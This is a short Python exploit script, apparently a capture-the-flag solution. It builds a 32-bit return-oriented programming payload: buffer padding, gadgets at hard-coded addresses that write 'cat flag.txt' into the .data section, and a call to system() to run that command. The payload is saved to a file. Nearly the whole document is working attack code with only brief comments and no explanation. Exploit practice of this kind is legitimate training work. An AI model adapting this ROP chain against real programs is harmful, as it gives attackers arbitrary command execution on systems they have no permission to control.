#!/usr/bin/python3

# Stage 0
junk = b'A' * 44 # junk

# Stage 1
pop1 = b'\xda\x86\x04\x08' # overwrite eip; Gadget: 'pop ebp, pop edi'
mov1 = b'\x70\x86\x04\x08' # Gadget: 'mov edi, ebp'
edi1 = b'\x28\xa0\x04\x08' # memory address of .data
code1 = b'cat ' # first 4 bytes

# Stage 2
edi2 = b'\x2c\xa0\x04\x08' # new .data address (edi1 + 4)
code2 = b'flag' # next 4 bytes of the string

# Stage 3
edi3 = b'\x30\xa0\x04\x08' # new .data address (edi1 + 8)
code3 = b'.txt' # next 4 bytes of the string

# RCE
system = b'\x30\x84\x04\x08' # address of system()
fakeret = b'A' * 4 # fake return address

# Build payload
payload = junk
payload += pop1 + edi1 + code1 + mov1
payload += pop1 + edi2 + code2 + mov1
payload += pop1 + edi3 + code3 + mov1
payload += system + fakeret + edi1

with open('rop.txt', 'wb') as w:
        w.write(payload)
